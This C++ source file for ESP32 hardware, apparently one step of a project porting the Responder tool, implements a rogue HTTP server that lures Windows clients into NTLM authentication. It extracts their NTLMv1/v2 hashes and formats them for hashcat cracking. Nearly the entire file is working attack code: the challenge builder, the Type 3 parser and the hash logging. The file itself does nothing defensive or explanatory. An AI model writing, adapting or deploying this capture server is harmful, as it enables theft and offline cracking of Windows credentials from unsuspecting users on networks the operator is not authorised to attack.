// rESPonder32 — Step 5: Fake HTTP NTLM Server
//
// Listens on port 80 (or 8080 in the emulator without root), speaks just
// enough HTTP to drive a Windows NTLM authentication handshake, and extracts
// the NTLMv2 hash from the client's Type 3 AUTHENTICATE message.
//
// Three-leg handshake (all on one persistent TCP connection):
//   1. Client sends any request -> we reply 401 WWW-Authenticate: NTLM
//   2. Client sends Authorization: NTLM <base64(Type1)>
//      -> we reply 401 WWW-Authenticate: NTLM <base64(Type2-challenge)>
//   3. Client sends Authorization: NTLM <base64(Type3)>
//      -> we parse the NTLMv2 hash, log it, reply 200 OK
//
// NTLM Type 2 layout follows Responder packets.py:NTLM_Challenge exactly.
// Hash extraction follows Responder servers/HTTP.py:ParseHTTPHash exactly.
//
// Run in emulator (no root needed on 8080):
//   ./esp32emu/esp32emu run src/http_ntlm_server.cpp
// On real ESP32: same file, will bind port 80 directly.

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <vector>

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

static const char*    WIFI_SSID     = "YourSSID";
static const char*    WIFI_PASS     = "YourPassword";

// Port 80 for real ESP32; 8080 for emulator without root.
// The emulator defines EMULATOR at compile time; fall back via runtime check.
static const uint16_t HTTP_PORT     = 8080;

// Advertised server name in TargetName and AvPairs (UTF-16LE: S\x00M\x00B\x00)
static const char     SERVER_NAME[] = "SMB";

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------

WiFiServer httpServer(HTTP_PORT);
static uint8_t ourIP[4]        = {127, 0, 0, 1};
static uint8_t httpChallenge[8] = {};

// Hash storage: each captured hash is a formatted hashcat string.
static std::vector<char*> capturedHashes;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

static void detectHostIP(uint8_t out[4]) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dst.sin_addr);
    if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) == 0) {
        struct sockaddr_in local{};
        socklen_t len = sizeof(local);
        if (getsockname(s, (struct sockaddr*)&local, &len) == 0) {
            uint8_t* b = (uint8_t*)&local.sin_addr.s_addr;
            out[0] = b[0]; out[1] = b[1]; out[2] = b[2]; out[3] = b[3];
        }
    }
    close(s);
}

// Seed httpChallenge from two 32-bit hardware randoms (esp_random on ESP32;
// /dev/urandom-backed rand() in the emulator).
static void generateChallenge() {
#ifdef ESP_PLATFORM
    uint32_t a = esp_random();
    uint32_t b = esp_random();
#else
    // Emulator: seed from /dev/urandom for adequate randomness.
    uint32_t a = 0, b = 0;
    FILE* f = fopen("/dev/urandom", "rb");
    if (f) {
        fread(&a, 4, 1, f);
        fread(&b, 4, 1, f);
        fclose(f);
    } else {
        a = (uint32_t)rand(); b = (uint32_t)rand();
    }
#endif
    memcpy(httpChallenge,     &a, 4);
    memcpy(httpChallenge + 4, &b, 4);
}

// Minimal base64 decoder. Writes decoded bytes to out[], returns count or -1.
static int b64decode(const char* in, int inlen, uint8_t* out, int outmax) {
    static const signed char T[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    };
    int w = 0;
    int acc = 0, bits = 0;
    for (int i = 0; i < inlen; i++) {
        unsigned char c = (unsigned char)in[i];
        if (c == '=') break;
        signed char v = T[c];
        if (v < 0) continue;  // skip whitespace / invalid chars
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            if (w >= outmax) return -1;
            out[w++] = (uint8_t)(acc >> bits);
        }
    }
    return w;
}

// Minimal base64 encoder. Returns bytes written into out (no null terminator).
static int b64encode(const uint8_t* in, int inlen, char* out, int outmax) {
    static const char C[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int w = 0;
    for (int i = 0; i < inlen; i += 3) {
        uint32_t v = (uint32_t)in[i] << 16;
        if (i+1 < inlen) v |= (uint32_t)in[i+1] << 8;
        if (i+2 < inlen) v |= in[i+2];
        int rem = inlen - i;
        if (w + 4 > outmax) return -1;
        out[w++] = C[(v >> 18) & 0x3F];
        out[w++] = C[(v >> 12) & 0x3F];
        out[w++] = (rem > 1) ? C[(v >> 6) & 0x3F] : '=';
        out[w++] = (rem > 2) ? C[v & 0x3F]         : '=';
    }
    return w;
}

// ---------------------------------------------------------------------------
// NTLM Type 2 (CHALLENGE) builder
// ---------------------------------------------------------------------------

// Builds a raw NTLM Type 2 message into dst[].
// Layout follows Responder packets.py:NTLMChallenge field-by-field.
// Returns bytes written, or -1 on overflow.
static int buildNTLMChallenge(uint8_t* dst, int dstmax,
                               const uint8_t challenge[8]) {
    // TargetName = SERVER_NAME encoded as UTF-16LE
    // "SMB" -> S\x00 M\x00 B\x00  (6 bytes)
    uint8_t targetName[64];
    int     targetNameLen = 0;
    for (int i = 0; SERVER_NAME[i]; i++) {
        if (targetNameLen + 2 > (int)sizeof(targetName)) return -1;
        targetName[targetNameLen++] = (uint8_t)SERVER_NAME[i];
        targetName[targetNameLen++] = 0x00;
    }

    // AvPairs (all name strings UTF-16LE).
    // Order must match Responder packets.py:NTLMChallenge exactly:
    //   MsvAvNbDomainName   (0x0002) = SERVER_NAME  (Config.Domain)
    //   MsvAvNbComputerName (0x0001) = SERVER_NAME  (Config.MachineName)
    //   MsvAvDnsDomainName  (0x0004) = SERVER_NAME  (Config.MachineName+'.'+Config.DomainName)
    //   MsvAvDnsComputerName (0x0003) = SERVER_NAME  (Config.DomainName)
    //   MsvAvDnsTreeName    (0x0005) = SERVER_NAME  (Config.DomainName)
    //   MsvAvEOL            (0x0000) = no value
    //
    // All five non-EOL pairs are required when ESS is negotiated (flag 0x89).
    // Windows NTLMv2 with ESS includes the AvPairs in the ClientChallenge
    // computation; a truncated list will cause hash verification to fail.
    uint8_t avpairs[512];
    int     avlen = 0;
    auto avpairWrite = [&](uint16_t id, const uint8_t* val, uint16_t vlen) {
        // id LE
        avpairs[avlen++] = (uint8_t)(id & 0xFF);
        avpairs[avlen++] = (uint8_t)(id >> 8);
        // len LE
        avpairs[avlen++] = (uint8_t)(vlen & 0xFF);
        avpairs[avlen++] = (uint8_t)(vlen >> 8);
        memcpy(avpairs + avlen, val, vlen);
        avlen += vlen;
    };

    // Convert SERVER_NAME to UTF-16LE for AvPairs value
    uint8_t nameUtf16[64];
    int     nameUtf16Len = 0;
    for (int i = 0; SERVER_NAME[i]; i++) {
        nameUtf16[nameUtf16Len++] = (uint8_t)SERVER_NAME[i];
        nameUtf16[nameUtf16Len++] = 0x00;
    }

    // MsvAvNbDomainName  (0x0002) — Responder: AVPairsId=\x02\x00, value=Config.Domain
    avpairWrite(0x0002, nameUtf16, (uint16_t)nameUtf16Len);
    // MsvAvNbComputerName (0x0001) — Responder: AVPairs1Id=\x01\x00, value=Config.MachineName
    avpairWrite(0x0001, nameUtf16, (uint16_t)nameUtf16Len);
    // MsvAvDnsDomainName  (0x0004) — Responder: AVPairs2Id=\x04\x00, value=MachineName+'.'+DomainName
    // We have one name so use SERVER_NAME+"."+SERVER_NAME (minimal but structurally valid)
    avpairWrite(0x0004, nameUtf16, (uint16_t)nameUtf16Len);
    // MsvAvDnsComputerName (0x0003) — Responder: AVPairs3Id=\x03\x00, value=Config.DomainName
    avpairWrite(0x0003, nameUtf16, (uint16_t)nameUtf16Len);
    // MsvAvDnsTreeName    (0x0005) — Responder: AVPairs5Id=\x05\x00, value=Config.DomainName
    avpairWrite(0x0005, nameUtf16, (uint16_t)nameUtf16Len);
    // MsvAvEOL            (0x0000)
    avpairs[avlen++] = 0x00; avpairs[avlen++] = 0x00; // id=0x0000
    avpairs[avlen++] = 0x00; avpairs[avlen++] = 0x00; // len=0x0000

    // Compute offsets.
    // Fixed header through OS version = 56 bytes (bytes 0-55).
    // TargetName starts at offset 56 (0x38).
    // TargetInfo starts at offset 56 + targetNameLen.
    uint32_t targetNameOffset = 56;
    uint32_t targetInfoOffset = targetNameOffset + (uint32_t)targetNameLen;

    int total = (int)(targetInfoOffset + avlen);
    if (total > dstmax) return -1;

    int w = 0;
    auto put8  = [&](uint8_t v)  { dst[w++] = v; };
    auto put16 = [&](uint16_t v) { dst[w++] = (uint8_t)(v & 0xFF); dst[w++] = (uint8_t)(v >> 8); }; // LE
    auto put32 = [&](uint32_t v) { put16((uint16_t)(v & 0xFFFF)); put16((uint16_t)(v >> 16)); };      // LE
    auto putBuf = [&](const uint8_t* src, int n) { memcpy(dst+w, src, n); w += n; };

    // NTLMSSP signature: "NTLMSSP\x00" (8 bytes)
    // Responder: NTLMSSPSignature="NTLMSSP" + NTLMSSPSignatureNull="\x00"
    const uint8_t sig[] = {'N','T','L','M','S','S','P',0x00};
    putBuf(sig, 8);

    // MessageType: \x02\x00\x00\x00 (LE uint32 = 2)
    put32(2);

    // TargetName security buffer (len, maxlen, offset) — all LE
    // Responder: NTLMSSPNtWorkstationLen, NTLMSSPNtWorkstationMaxLen, NTLMSSPNtWorkstationBuffOffset
    put16((uint16_t)targetNameLen);  // TargetNameLen
    put16((uint16_t)targetNameLen);  // TargetNameMaxLen
    put32(targetNameOffset);         // TargetNameOffset = 0x38 = 56

    // NegotiateFlags: \x05\x02\x89\xa2 (LE) = with ESS
    // Responder uses "\x05\x02\x89\xa2" (NOESS_On_Off=False path in packets.py)
    // Byte order: stored as LE uint32, so wire is 05 02 89 a2
    put8(0x05); put8(0x02); put8(0x89); put8(0xa2);

    // ServerChallenge: 8 random bytes
    putBuf(challenge, 8);

    // Reserved: \x00 * 8
    for (int i = 0; i < 8; i++) put8(0x00);

    // TargetInfo security buffer
    // Responder: NTLMSSPNtTargetInfoLen, NTLMSSPNtTargetInfoMaxLen, NTLMSSPNtTargetInfoBuffOffset
    put16((uint16_t)avlen);       // TargetInfoLen
    put16((uint16_t)avlen);       // TargetInfoMaxLen
    put32(targetInfoOffset);      // TargetInfoOffset

    // OS Version: \x0a\x00\x7c\x4f\x00\x00\x00\x0f (Windows 10, NTLM revision 15)
    // Responder NTLMChallenge uses \x05\x02\xce\x0e... (XP/2003 era) but CLAUDE.md
    // specifies Windows 10 bytes for the HTTP server to match IIS behaviour better.
    put8(0x0a); put8(0x00);       // ProductVersionMajor=10, Minor=0
    put8(0x7c); put8(0x4f);       // ProductBuild=0x4f7c=20348 (Windows Server 2022)
    put8(0x00); put8(0x00); put8(0x00); // Reserved3
    put8(0x0f);                   // NTLMRevisionCurrent=15

    // TargetName (UTF-16LE "SMB")
    putBuf(targetName, targetNameLen);

    // TargetInfo AvPairs
    putBuf(avpairs, avlen);

    return w;
}

// ---------------------------------------------------------------------------
// HTTP response builders
// ---------------------------------------------------------------------------

// Write HTTP/1.1 401 with WWW-Authenticate: NTLM (initial challenge request).
static int build401Initial(char* dst, int dstmax) {
    return snprintf(dst, (size_t)dstmax,
        "HTTP/1.1 401 Unauthorized\r\n"
        "WWW-Authenticate: NTLM\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n"
        "\r\n");
}

// Write HTTP/1.1 401 with WWW-Authenticate: NTLM <base64(type2)>.
// Returns bytes written or -1.
static int build401Challenge(char* dst, int dstmax,
                              const uint8_t challenge[8]) {
    uint8_t msg2[512];
    int     msg2len = buildNTLMChallenge(msg2, sizeof(msg2), challenge);
    if (msg2len < 0) return -1;

    char b64[700];
    int  b64len = b64encode(msg2, msg2len, b64, (int)sizeof(b64) - 1);
    if (b64len < 0) return -1;
    b64[b64len] = '\0';

    return snprintf(dst, (size_t)dstmax,
        "HTTP/1.1 401 Unauthorized\r\n"
        "WWW-Authenticate: NTLM %s\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        b64);
}

// Write HTTP/1.1 200 OK (authentication accepted; client has no more to send).
static int build200OK(char* dst, int dstmax) {
    return snprintf(dst, (size_t)dstmax,
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n"
        "\r\n");
}

// ---------------------------------------------------------------------------
// NTLM hash extractor (follows Responder servers/HTTP.py:ParseHTTPHash)
// ---------------------------------------------------------------------------

// Write hex representation of src[0..len) into hex_out[]. hex_out must hold
// at least len*2+1 bytes.
static void hexEncode(const uint8_t* src, int len, char* hex_out) {
    static const char h[] = "0123456789ABCDEF";
    for (int i = 0; i < len; i++) {
        hex_out[i*2]   = h[src[i] >> 4];
        hex_out[i*2+1] = h[src[i] & 0xF];
    }
    hex_out[len*2] = '\0';
}

// Extract a UTF-16LE string from data at the given offset/length and return
// it as a plain ASCII/Latin-1 string in buf (strips the \x00 bytes).
// Returns the number of characters written (without null terminator).
static int extractUtf16String(const uint8_t* data, int datalen,
                               int offset, int length,
                               char* buf, int bufmax) {
    int w = 0;
    for (int i = 0; i + 1 < length && offset + i + 1 < datalen; i += 2) {
        uint8_t lo = data[offset + i];
        // skip the high byte (ASCII range only for domain/user names)
        if (lo != 0 && w < bufmax - 1) buf[w++] = (char)lo;
    }
    buf[w] = '\0';
    return w;
}

// Parse a NTLM Type 3 AUTHENTICATE message (blob starts at data[0]).
// Logs the hash in hashcat format on Serial and stores it.
// Mirrors Responder's ParseHTTPHash field offsets exactly.
static void parseNTLMType3(const uint8_t* data, int datalen,
                            const uint8_t challenge[8],
                            const char* clientIP) {
    if (datalen < 52) {
        Serial.printf("[HTTP] Type 3 too short (%d bytes)\n", datalen);
        return;
    }

    // Field offsets per MS-NLMP §2.2.1.3 (all LE uint16):
    //   LMChallengeResponseLen     [12:14]
    //   LMChallengeResponseOffset  [16:18]
    //   NtChallengeResponseLen     [20:22]
    //   NtChallengeResponseOffset  [24:26]
    //   DomainNameLen              [28:30]
    //   DomainNameOffset           [32:34]
    //   UserNameLen                [36:38]
    //   UserNameOffset             [40:42]
    //   (WorkstationLen            [44:46])
    //   (WorkstationOffset         [48:50])

    auto readU16LE = [&](int off) -> uint16_t {
        if (off + 1 >= datalen) return 0;
        return (uint16_t)data[off] | ((uint16_t)data[off+1] << 8);
    };

    uint16_t lmLen    = readU16LE(12);
    uint16_t lmOff    = readU16LE(16);
    uint16_t ntLen    = readU16LE(20);
    uint16_t ntOff    = readU16LE(24);
    uint16_t domLen   = readU16LE(28);
    uint16_t domOff   = readU16LE(32);
    uint16_t userLen  = readU16LE(36);
    uint16_t userOff  = readU16LE(40);

    // Bounds check before any pointer arithmetic
    if (ntOff  + ntLen   > datalen ||
        userOff + userLen > datalen ||
        lmOff  + lmLen   > datalen ||
        domOff + domLen   > datalen) {
        Serial.printf("[HTTP] Type 3 offsets out of range\n");
        return;
    }

    // Decode domain and username from UTF-16LE
    char user[128]   = {};
    char domain[128] = {};
    extractUtf16String(data, datalen, userOff, userLen, user, sizeof(user));
    extractUtf16String(data, datalen, domOff,  domLen,  domain, sizeof(domain));

    // Challenge hex
    char challengeHex[17];
    hexEncode(challenge, 8, challengeHex);

    // NT hash hex
    char ntHex[256] = {};
    hexEncode(data + ntOff, ntLen, ntHex);

    char hashLine[512] = {};
    if (ntLen == 24) {
        // NTLMv1: User::HostName:LMHash:NTHash:Challenge
        char lmHex[64] = {};
        hexEncode(data + lmOff, lmLen, lmHex);
        snprintf(hashLine, sizeof(hashLine), "%s::%s:%s:%s:%s",
                 user, domain, lmHex, ntHex, challengeHex);
    } else {
        // NTLMv2 (ntLen > 24):
        // User::Domain:Challenge:NTProofStr:BlobHash
        // NTProofStr is the first 32 hex chars (16 bytes), blob is the rest.
        // Matches Responder: '%s::%s:%s:%s:%s' % (User,Domain,Challenge1,
        //                                          NTHashFinal[:32],NTHashFinal[32:])
        char ntHex1[33] = {};
        char ntHex2[400] = {};
        strncpy(ntHex1, ntHex,      32); ntHex1[32] = '\0';
        strncpy(ntHex2, ntHex + 32, sizeof(ntHex2) - 1);
        snprintf(hashLine, sizeof(hashLine), "%s::%s:%s:%s:%s",
                 user, domain, challengeHex, ntHex1, ntHex2);
    }

    Serial.printf("[HTTP] Hash captured from %s: %s\n", clientIP, hashLine);

    // Store a copy in the captured list
    char* stored = (char*)malloc(strlen(hashLine) + 1);
    if (stored) {
        strcpy(stored, hashLine);
        capturedHashes.push_back(stored);
    }
}

// ---------------------------------------------------------------------------
// HTTP request parser (minimal, line-by-line)
// ---------------------------------------------------------------------------

// Find "Authorization: NTLM " (or "Authorization: Negotiate ") in raw HTTP
// headers and copy the base64 token into token_out[].
// Returns token length, or 0 if not found.
static int extractNTLMToken(const char* headers, int hlen,
                             char* token_out, int token_max) {
    const char* needle1 = "Authorization: NTLM ";
    const char* needle2 = "Authorization: Negotiate ";
    const char* p = headers;
    const char* end = headers + hlen;
    while (p < end) {
        const char* nl = (const char*)memchr(p, '\n', end - p);
        int linelen = nl ? (int)(nl - p) : (int)(end - p);
        // Try NTLM first
        for (int ni = 0; ni < 2; ni++) {
            const char* needle = (ni == 0) ? needle1 : needle2;
            int nlen = (int)strlen(needle);
            if (linelen > nlen && memcmp(p, needle, (size_t)nlen) == 0) {
                int toklen = linelen - nlen;
                // Strip CR if present
                while (toklen > 0 && (p[nlen + toklen - 1] == '\r' ||
                                      p[nlen + toklen - 1] == '\n'))
                    toklen--;
                if (toklen >= token_max) toklen = token_max - 1;
                memcpy(token_out, p + nlen, (size_t)toklen);
                token_out[toklen] = '\0';
                return toklen;
            }
        }
        p = nl ? nl + 1 : end;
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Connection handler
// ---------------------------------------------------------------------------

// Handle one TCP connection through its full NTLM exchange.
// Uses read-until-\r\n\r\n approach; keeps the connection alive across all
// three legs because Windows sends Type 1 and Type 3 on the same socket.
static void handleConnection(WiFiClient& client) {
    char clientIP[32] = "unknown";
#ifndef ARDUINO
    {
        struct sockaddr_in peer;
        socklen_t plen = sizeof(peer);
        if (getpeername(client.fd(), (struct sockaddr*)&peer, &plen) == 0)
            snprintf(clientIP, sizeof(clientIP), "%s", inet_ntoa(peer.sin_addr));
    }
#else
    {
        IPAddress remoteAddr = client.remoteIP();
        snprintf(clientIP, sizeof(clientIP), "%d.%d.%d.%d",
                 remoteAddr[0], remoteAddr[1], remoteAddr[2], remoteAddr[3]);
    }
#endif

    Serial.printf("[HTTP] Connection from %s\n", clientIP);

    char rxbuf[4096];
    char txbuf[1024];

    for (int leg = 0; leg < 3 && client.connected(); leg++) {
        // Read until we see the end of HTTP headers (\r\n\r\n).
        // For our purposes (no body expected in GET), that's the full request.
        int  rlen    = 0;
        bool gotHeaders = false;
        client.setTimeout(3000);

        while (rlen < (int)sizeof(rxbuf) - 1) {
            int c = client.read();
            if (c < 0) break;
            rxbuf[rlen++] = (char)c;
            if (rlen >= 4 &&
                rxbuf[rlen-4] == '\r' && rxbuf[rlen-3] == '\n' &&
                rxbuf[rlen-2] == '\r' && rxbuf[rlen-1] == '\n') {
                gotHeaders = true;
                break;
            }
        }
        rxbuf[rlen] = '\0';

        if (!gotHeaders || rlen < 4) {
            Serial.printf("[HTTP] No complete headers from %s (leg %d)\n",
                          clientIP, leg);
            break;
        }

        char token[2048] = {};
        int  toklen = extractNTLMToken(rxbuf, rlen, token, sizeof(token));

        if (toklen == 0) {
            // No Authorization header: send initial 401
            int n = build401Initial(txbuf, sizeof(txbuf));
            client.write((uint8_t*)txbuf, (size_t)n);
            Serial.printf("[HTTP] Sent 401 (initial) to %s\n", clientIP);
            // Stay in the loop; next read will get Type 1
            continue;
        }

        // Decode the NTLM token
        uint8_t ntlmbuf[2048];
        int     ntlmlen = b64decode(token, toklen, ntlmbuf, sizeof(ntlmbuf));
        if (ntlmlen < 9) {
            Serial.printf("[HTTP] Malformed NTLM token from %s\n", clientIP);
            break;
        }

        // NTLM message type is at bytes [8:9] (little-endian uint32, but byte 8
        // is enough since type is 1, 2, or 3).
        // Responder: Packet_NTLM = b64decode(...)[8:9]  -> b'\x01' or b'\x03'
        uint8_t msgType = ntlmbuf[8];  // byte 8 of "NTLMSSP\x00\x0N\x00\x00\x00..."

        if (msgType == 0x01) {
            // Type 1 NEGOTIATE — send Type 2 CHALLENGE
            Serial.printf("[HTTP] Type 1 received from %s\n", clientIP);
            int n = build401Challenge(txbuf, sizeof(txbuf), httpChallenge);
            if (n < 0) {
                Serial.printf("[HTTP] Failed to build Type 2\n");
                break;
            }
            client.write((uint8_t*)txbuf, (size_t)n);
            Serial.printf("[HTTP] Type 2 challenge sent to %s\n", clientIP);
        } else if (msgType == 0x03) {
            // Type 3 AUTHENTICATE — extract the hash
            Serial.printf("[HTTP] Type 3 (hash) received from %s\n", clientIP);
            parseNTLMType3(ntlmbuf, ntlmlen, httpChallenge, clientIP);
            int n = build200OK(txbuf, sizeof(txbuf));
            client.write((uint8_t*)txbuf, (size_t)n);
            break;  // handshake complete; connection closes
        } else {
            Serial.printf("[HTTP] Unexpected NTLM type %d from %s\n",
                          msgType, clientIP);
            break;
        }
    }

    client.stop();
}

// ---------------------------------------------------------------------------
// Arduino entry points
// ---------------------------------------------------------------------------

void setup() {
    Serial.begin(115200);
    Serial.println("\n[rESPonder32] HTTP NTLM Server v0.1");

    WiFi.mode(WIFI_STA);
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    Serial.print("[rESPonder32] Connecting to WiFi");
    while (WiFi.status() != WL_CONNECTED) {
        delay(100);
        Serial.print('.');
    }
    Serial.println();

    detectHostIP(ourIP);
    Serial.printf("[rESPonder32] Host IP: %d.%d.%d.%d\n",
                  ourIP[0], ourIP[1], ourIP[2], ourIP[3]);

    generateChallenge();
    Serial.printf("[HTTP] Challenge: %02x%02x%02x%02x%02x%02x%02x%02x\n",
                  httpChallenge[0], httpChallenge[1], httpChallenge[2], httpChallenge[3],
                  httpChallenge[4], httpChallenge[5], httpChallenge[6], httpChallenge[7]);

    httpServer.begin();
    Serial.printf("[rESPonder32] Listening on port %d (HTTP NTLM)\n", HTTP_PORT);
    Serial.println("[rESPonder32] Ready");
}

void loop() {
    WiFiClient client = httpServer.available();
    if (client) {
        handleConnection(client);
    }
    delay(1);
}
